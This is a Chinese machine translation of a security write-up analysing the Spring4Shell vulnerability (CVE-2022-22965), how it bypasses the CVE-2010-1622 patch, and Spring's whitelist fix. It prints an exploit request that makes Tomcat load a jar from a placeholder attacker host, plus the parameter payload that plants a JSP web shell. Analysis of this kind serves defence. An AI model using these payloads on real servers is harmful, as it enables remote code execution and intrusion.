<html>
<head>
<title>Anatomy Of Spring4Shell CVE-2022–22965</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CVE春天4号的解剖图-2022–22965</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/anatomy-of-spring4shell-cve-2022-22965-e0df259cef9d?source=collection_archive---------1-----------------------#2022-05-20">https://infosecwriteups.com/anatomy-of-spring4shell-cve-2022-22965-e0df259cef9d?source=collection_archive---------1-----------------------#2022-05-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/14d29dc9e832712bcca19944e2cbf81c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jnDuRXNfIPLZy_q7hw8RBA.png"/></div></div></figure><p id="3723" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">2022年3月29日，一个非常流行的Java开源框架Spring Framework披露了一个严重的远程代码执行漏洞。该漏洞被命名为CVE-2022–22965，它源于2010年修复另一个远程代码执行的补丁，该补丁被分配为CVE-2010–1622。解决CVE-2010–1622的宽松限制为CVE-2022–22965铺平了道路。这篇博文将分析CVE-2010–1622的补丁是如何被绕过并导致CVE-2022–22965的。最后，您将看到Spring Framework提供的解决方案来解决CVE-2010–1622和CVE-2022–22965的漏洞。</p><h1 id="ff94" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">必备知识</h1><h1 id="42e3" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">Tomcat AccessLogValve</h1><p id="844d" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">CVE-2022–22965的要求之一是Apache Tomcat充当易受攻击的web应用程序中的Servlet容器。</p><p id="d115" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Tomcat使用org . Apache . catalina . valves . accesslog valve来管理access_log文件设置，并且在Tomcat附带的conf/server.xml文件中有相关的配置。</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="cadf" class="mi kx iq me b gy mj mk l ml mm">&lt;Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs"<br/>               prefix="localhost_access_log" suffix=".txt"<br/>               pattern="%h %l %u %t &amp;quot;%r&amp;quot; %s %b" /&gt;</span></pre><p id="0f2f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">AccessLogValve的一些关键选项如下:</p><p id="d6b0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">目录</strong>:该阀门创建的日志文件所在目录的绝对或相对路径名。如果指定了相对路径，它将被解释为相对于$CATALINA_BASE。如果未指定目录属性，则默认为“logs”(相对于$CATALINA_BASE)。</p><p id="78b6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">前缀</strong>:加在每个日志文件名开头的前缀。如果未指定，默认值为“access_log”。</p><p id="e682" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">模式</strong>:一种格式布局，标识要记录的请求和响应中的各个信息字段，或者选择常用词组合。</p><p id="89bc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">后缀</strong>:添加到每个日志文件名末尾的后缀。如果未指定，默认为" "(零长度字符串)，这意味着不会添加后缀。</p><p id="b9aa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">文件日期格式</strong>:允许在访问日志文件名中自定义时间戳。每当格式化的时间戳改变时，文件就旋转。默认值为。yyyy年月日。如果希望每小时轮换一次，则将该值设置为。yyyy-MM-dd.HH。</p><blockquote class="mn mo mp"><p id="7e62" class="jy jz mq ka b kb kc kd ke kf kg kh ki mr kk kl km ms ko kp kq mt ks kt ku kv ij bi translated"><em class="iq">注意:修改文件日期格式会触发日志文件切换。</em></p></blockquote><p id="c52d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">CVE-2022–22965的攻击利用了AccessLogValve类，引用该类的实例并在运行时修改其属性。我们将在CVE-2022–22965有效载荷中再次看到它。</p><h1 id="20bb" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">关于JavaBean参数绑定</h1><p id="49cb" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">CVE-2022–22965只影响Spring默认绑定。Spring使用数据绑定来解析HTTP请求。提交的参数可以自动动态绑定到一个java bean对象，该对象执行类型转换和值赋值。</p><p id="726e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">一个简单的例子用来解释参数绑定是如何工作的。有一个非常基本的web应用程序，包含ExploitMeController.java、User.java和Department.java，它们分别定义如下:</p><p id="23e6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ExploitMeController.java</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="742b" class="mi kx iq me b gy mj mk l ml mm">@Controller<br/>public class ExploitMeController {<br/>​<br/>    @GetMapping("/exploitme")<br/>    public String exploitMeForm(User  user, Model model) {<br/>        System.out.println(user);<br/>        return "hello";<br/>    }<br/>}</span></pre><p id="fdb2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">User.java</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="1e51" class="mi kx iq me b gy mj mk l ml mm">public class User {<br/>    private String name;<br/>    private Department department;<br/>​<br/>    public String getName() {<br/>        return name;<br/>    }<br/>​<br/>    public void setName(String name) {<br/>        this.name = name;<br/>    }<br/>​<br/>    public Department getDepartment() {<br/>        return department;<br/>    }<br/>​<br/>    public void setDepartment(Department department) {<br/>        this.department = department;<br/>    }<br/>}</span></pre><p id="c3d2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Department.java</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="c358" class="mi kx iq me b gy mj mk l ml mm">public class Department {<br/>    private String name;<br/>​<br/>    public String getName() {<br/>        return name;<br/>    }<br/>​<br/>    public void setName(String name) {<br/>        this.name = name;<br/>    }<br/>}</span></pre><p id="3f80" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当客户提出以下请求时:</p><p id="85b6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae mu" href="http://localhost:8080/spring4shell/exploitme?name=APP&amp;department.name=SEC" rel="noopener ugc nofollow" target="_blank"><em class="mq">http://localhost:8080/spring 4 shell/exploit me？name = APP&amp;department . name = SEC</em>T3】</a></p><p id="4853" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><em class="mq">姓名</em>绑定到用户名<em class="mq">部门名</em>绑定到用户名</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mv"><img src="../Images/35a6974e4c9b65a4bafcef20c23b5694.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HEc_vbWC1JRKZg8VXaYIoA.png"/></div></div></figure><p id="a185" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">HTTP请求参数中<em class="mq"> department.name </em>的绑定过程简化为以下方法链:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="9f8c" class="mi kx iq me b gy mj mk l ml mm">User.getDepartment()<br/>    Department.setName() //it is setName</span></pre><p id="8c8e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果更进一步，将上述应用程序的请求参数更改为a.b.c.d，方法链就变成了(假设方法链中每个对象的所有访问器和赋值器都已定义) :</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="5bfc" class="mi kx iq me b gy mj mk l ml mm">User.getA()<br/>        a.getB()<br/>            b.getC()<br/>                c.setD() //it is setD</span></pre><h1 id="6484" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">前奏:CVE——2010年至1622年</h1><p id="be79" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">有了一些参数绑定的基础知识，我们将看看CVE-2010–1622。CVE-2010–1622的关键概述如下:</p><ol class=""><li id="6e47" class="mw mx iq ka b kb kc kf kg kj my kn mz kr na kv nb nc nd ne bi translated">所有Java对象都隐式包含一个<em class="mq"> getClass() </em>方法，该方法返回描述对象类的运行时类对象。</li><li id="fde8" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated"><em class="mq">类</em>对象有一个<em class="mq"> getClassLoader() </em>访问器来获取ClassLoader对象。ClassLoader负责加载类。</li><li id="f4d9" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated">Tomcat为其web应用程序提供了自己的类加载器。这个类装入器包含各种成员。其中之一是<em class="mq"> URLs </em>，这是类加载器用来检索资源的URL数组。</li><li id="fcec" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated">如果该URL被另一个指向攻击者控制的JAR文件的URL覆盖，就会导致Tomcat远程加载该JAR文件。</li></ol><p id="fb0e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">以下利用示例说明了该漏洞是如何在外界被操纵的:</p><ol class=""><li id="c20f" class="mw mx iq ka b kb kc kf kg kj my kn mz kr na kv nb nc nd ne bi translated">攻击者创建exp.jar并通过<a class="ae mu" href="http://attacker/exp.jar" rel="noopener ugc nofollow" target="_blank"><em class="mq">http://attacker/exp . jar</em></a><em class="mq">使其可用。</em>这个罐子应该包含两种文件:</li></ol><ul class=""><li id="4f9a" class="mw mx iq ka b kb kc kf kg kj my kn mz kr na kv nk nc nd ne bi translated">定义一些标签并指定这些标签的spring-form.tld被实现为标签文件。</li><li id="9d28" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nk nc nd ne bi translated">包含任意Java代码的标记文件。</li></ul><p id="811e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">2.攻击者发送带有精心编制的参数的HTTP请求:<a class="ae mu" href="http://demo/login?class.classLoader.URLs" rel="noopener ugc nofollow" target="_blank"> http://demo/login？class . class loader . URLs</a>[0]= jar:<a class="ae mu" href="http://attacker/exp.jar!/" rel="noopener ugc nofollow" target="_blank">http://attack/exp . jar！/ </a>。</p><p id="dad0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">此时，WebApp类加载器的repositoryURLs属性的第零个元素被攻击者的URL覆盖。</p><p id="b197" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">3.在服务器端，下载exp.jar，解析tld文件中定义的标记，然后执行远程代码。</p><h1 id="41c9" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">CVE补丁-2010–1622</h1><p id="41b5" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">该漏洞的罪魁祸首是参数绑定。类加载器包含许多可以在运行时从外部设置的成员，因此它产生了许多安全问题。在这种情况下，Spring发布了一个补丁来拒绝classLoader。</p><p id="1f3c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在CachedIntrospectionResults方法中，补丁以绿色矩形突出显示，pd是一个java.beans.PropertyDescriptor实例，它描述了Java bean的属性(name/getter/setter/…)。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nl"><img src="../Images/a7aed86dc05a54900f2fe9b3c7de504c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ye6mitNJSxCxms2uBXlySg.png"/></div></div></figure><p id="86ea" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当class.classLoader在利用有效负载<a class="ae mu" href="http://localhost/login?class.classLoader.URLs" rel="noopener ugc nofollow" target="_blank"> <em class="mq"> http://localhost/login？class . class loader . URLs</em></a><em class="mq">【0】= jar:</em><a class="ae mu" href="http://attacker/exp.jar!/" rel="noopener ugc nofollow" target="_blank"><em class="mq">http://attack/exp . jar！/ </em> </a>被绑定，它符合条件:Class.class == beanClass和“classLoader”。equals(pd.getName())(即属性名是classLoader)，所以<em class="mq"> class.classLoader </em>不会解析，从而阻止了攻击。</p><p id="1368" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在简化的参数绑定方法链中，补丁的工作方式如下:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/d3b05d10c79a8c69d17bf356e48d9fc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8vzqpvmYuCehSRY-O6JJrg.png"/></div></div></figure><h1 id="0533" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">揭开CVE的神秘面纱</h1><p id="31c1" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">现在是CVE 2022-22965的时候了。大量博客帖子提供了CVE-2022–22965的概念验证，例如<a class="ae mu" href="https://checkmarx.com/resources/homepage/springshell-remote-code-execution-via-spring-web" rel="noopener ugc nofollow" target="_blank"><em class="mq">https://check Marx . com/resources/home page/spring shell-remote-code-execution-via-spring-web</em></a><em class="mq">。</em></p><p id="ada5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">典型的有效负载如下所示:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="f9c3" class="mi kx iq me b gy mj mk l ml mm">class.module.classLoader.resources.context.parent.pipeline.first.pattern=[Web shell code]<br/>class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp<br/>class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT<br/>class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar<br/>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span></pre><p id="a05b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">class . module . class loader . resources . context . parent . pipeline . first . *对应于Tomcat <a class="ae mu" href="https://tomcat.apache.org/tomcat-7.0-doc/api/org/apache/catalina/valves/AccessLogValve.html" rel="noopener ugc nofollow" target="_blank"> AccessLogValve </a>类，该类将访问日志输出到背景知识部分中提到的文件。是JDK 9推出的模块系统(这也解释了为什么这个漏洞的范围是JDK 9+)。</p><p id="af1e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以通过HTTP请求参数修改AccessLogValve属性，比如<a class="ae mu" href="https://tomcat.apache.org/tomcat-8.0-doc/api/org/apache/catalina/valves/AbstractAccessLogValve.html#pattern" rel="noopener ugc nofollow" target="_blank">class . module . class loader . resources . context . parent . pipeline . first . pattern</a>，在web apps/根目录下创建一个带有恶意代码的JSP文件。关于POC的更多信息可以很容易地在网上找到。</p><p id="368c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在下图中，有效负载<a class="ae mu" href="https://tomcat.apache.org/tomcat-8.0-doc/api/org/apache/catalina/valves/AbstractAccessLogValve.html#pattern" rel="noopener ugc nofollow" target="_blank">class . module . class loader . resources . context . parent . pipeline . first . pattern</a>的参数绑定过程中的方法链展示了它如何绕过CVE-2010–1622的补丁(在绿色矩形中):</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nn"><img src="../Images/566769e92ab381aac14e1f2f8ec09d19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9BEw8ia3RlSHZEEiAWokNg.png"/></div></div></figure><h1 id="2700" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">解决办法</h1><p id="0e72" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">对CVE-2010–1622的修复是不完整的，因此出现了利用遗留缺陷的新路径。现在Spring Framework 5.3.18和5.2.20都修复了bug，主要补丁<a class="ae mu" href="https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15" rel="noopener ugc nofollow" target="_blank">如下</a>:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/77d3b411d4bd2eff63c74f65016a0af3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VQmISk4D9ol0zOj8zjk6yw.png"/></div></div></figure><p id="76f6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">对Java所做的更改(在JDK 9中引入模块系统)使CVE-2010–1622的Spring Framework黑名单方法失效。从上面的代码更改中可以看出，CVE-2010–1622修复中的黑名单方法被替换为白名单方法，以仅允许安全类属性。<strong class="ka ir">白名单是一种比黑名单</strong>更严格的方法，它被用作针对报告的攻击媒介的更充分的解决方案。但不幸的是，在Spring Framework这样的复杂框架中，拒绝危险的功能仍然很普遍。</p></div></div>    
</body>
</html>